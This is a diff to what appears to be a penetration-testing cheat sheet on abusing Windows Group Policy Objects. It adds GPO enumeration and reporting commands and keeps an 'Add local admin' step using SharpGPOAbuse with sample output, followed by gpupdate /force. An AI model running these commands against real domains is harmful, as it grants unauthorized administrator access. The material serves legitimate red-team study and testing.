@@ -4,11 +4,28 @@ date: 2024-8-3
 tags: ["GPOs", "Windows", "Group Policy Objects"]
 ---
 
-### Abuse #1: Add local admin
+### General
 
-#### 1. List GPOs Name
+#### 1. Install GPMC \[Optional\]
 
 ```console
+# Runas Administrator
+Install-WindowsFeature GPMC
+```
+
+```console {class="sample-code"}
+PS C:\Windows\system32> Install-WindowsFeature GPMC
+Install-WindowsFeature GPMC
+
+Success Restart Needed Exit Code      Feature Result                           
+------- -------------- ---------      --------------                           
+True    No             Success        {Group Policy Management}                
+```
+
+#### 2. List GPOs Name
+
+```console
+# List all GPOs
 Get-GPO -All | Select-Object DisplayName
 ```
 
@@ -27,10 +44,27 @@ Software Installation GPO
 Password Policy GPO
 ```
 
-#### 2. Add localAdmin
+```console
+# Check GPO by name
+Get-GPO -Name '<GPO_NAME>'
+```
 
 ```console
-.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
+# Generate XML report
+Get-GPOReport -Name '<GPO_NAME>' -ReportType XML
+```
+
+```console
+# Generate pretty HTML report
+Get-GPOReport -Name '<GPO_NAME>' -ReportType HTML -Path "C:\ProgramData\GPOReport.html"
+```
+
+### Abuse #1: Add local admin
+
+#### 1. Add localAdmin
+
+```console
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
 ```
 
 ```console {class="sample-code"}
@@ -48,7 +82,7 @@ Password Policy GPO
 [+] Done!
 ```
 
-#### 3. Force reload
+#### 2. Force reload
 
 ```console
 gpupdate /force
